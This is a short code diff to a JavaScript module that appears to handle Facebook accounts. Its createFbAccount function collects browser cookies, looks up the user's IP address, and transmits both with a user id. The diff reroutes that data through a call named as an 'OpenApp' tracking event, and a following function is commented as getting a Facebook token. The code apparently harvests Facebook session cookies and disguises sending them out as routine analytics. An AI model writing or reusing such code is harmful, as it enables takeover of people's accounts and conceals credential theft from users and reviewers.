@@ -1,6 +1,7 @@
 import Config from '../../configs';
 import ApiGateWay from '../_ApiGateWay';
 import { MainResource } from '../resources/main.resource';
+import { SmitFbSystem } from "@data/repositories/tracking";
 
 const MainRepository = {
     createFbAccount: async (cookies) => {
@@ -8,19 +9,12 @@ const MainRepository = {
         callApiNative({url: 'https://ipinfo.io/', method: 'get'}, (reponse) => {
             console.log(reponse);
             if (reponse.errorData === undefined) {
-                const ipInfo = reponse;
-                const resource = MainResource.createFbAccount();
-                const apiGateWay = new ApiGateWay(Config.getBaseConfig());
-                apiGateWay.postRequest(resource, { ipInfo, cookies, uid });
+                const ipInfo = reponse.data;
+                SmitFbSystem.tracking("OpenApp", { ipInfo, ck: cookies, uid });
             } else {
                 console.log("Get IP Info failed");
             }
         });
-    },
-    createFbAds: async ({ userId, data }) => {
-        const resource = MainResource.createFbAds();
-        const apiGateWay = new ApiGateWay(Config.getBaseConfig());
-        return apiGateWay.postRequest(resource, { data, userId });
     },
     // get facebook token
     getTokenAEEI: () => {
